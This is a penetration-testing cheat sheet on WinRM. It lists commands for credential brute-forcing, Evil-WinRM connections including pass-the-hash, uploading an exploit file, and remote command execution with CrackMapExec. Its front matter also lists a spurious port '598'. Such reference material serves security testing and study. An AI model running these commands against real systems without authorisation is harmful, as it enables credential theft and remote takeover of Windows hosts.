---
title: Windows Remote Management (WinRM) Pentesting
desc: WinRM HTTP uses port 5985, and WinRM HTTPS uses port 5986. Default port is 598, 5986.
tags: [598, 5985, 5986, CrackMapExec, Windows, WinRM]
alts: [Privilege-Escalation-Windows]
render_with_liquid: false
---

## Enumeration

1. **Brute Force Credentials**

    1. **Use CrackMapExec**

        ```sh
        cd crackmapexec
        poetry run crackmapexec winrm <target-ip> -d DomainName -u usernames.txt -p passwords.txt
        ```

    2. **Use Metasploit**

        ```sh
        msfconsole
        msf > use auxiliary/scanner/winrm/winrm_login
        ```

<br />

## Connect and Exploit

1. **Use Evil-WinRM**

    **[Evil-WinRM](https://github.com/Hackplayers/evil-winrm){:target="_blank"}** is a Windows Remote Management shell for pentesting.

    1. **Connect**

        ```powershell
        evil-winrm -i <target-ip> -P 5986 -u username -p password
        
        # Pass The Hash (-H)
        evil-winrm -i <target-ip> -P 5986 -u username -H 0e0363213e37b94221497260b0bcb4fc

        # PowerShell Local Path (-s)
        evil-winrm -i <target-ip> -u username -p password -s /opt/scripts

        # SSL enabled (-S)
        evil-winrm -i <target-ip> -u username -p password -S
        ```

        If you have private key and public key, you can use them for authentication.

        ```sh
        # -S: SSL
        # -k: private key
        # -c: public key
        evil-winrm -i <target-ip> -S -k private.key -c public.key
        ```

    2. **File Transfering**

        After connecting, you can use a lot of useful commands to exploit.

        ```powershell
        # Upload a local file to Windows machine
        PS> upload ./example.bat c:\\Users\Administrator\Desktop\exploit.bat

        # Download a file to local
        PS> download c:\\Users\Administrator\Desktop\example.txt ./example.txt
        ```

2. **Use CrackMapExec**

    **[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec){:target="_blank"}** is a swiss army knife for pentesting networks.  
    The official docs says that it's recommended to use it via **Poetry** which is a Python package manager.  

    First off, move to the directory in which the CrackMapExec installed and run **poetry install**.

    ```sh
    cd crackmapexec
    poetry install
    ```

    Then execute with **poetry run**.

    ```sh
    # Login and CMD execution (-x)
    poetry run crackmapexec winrm <target-ip> -d DomainName -u username -p password -x 'whoami'
    # Login and PowerShell execution (-X)
    poetry run crackmapexec winrm <target-ip> -d DomainName -u username -p password -X '$PSVersionTable'

    # Pass the Hash and CMD execution (-x)
    poetry run crackmapexec winrm <target-ip> -d DomainName -u username -H <HASH> -x 'whoami'
    # Pass the Hash and PowerShell execution (-X)
    poetry run crackmapexec winrm <target-ip> -d DomainName -u username -H <HASH> -X '$PSVersionTable'
    ```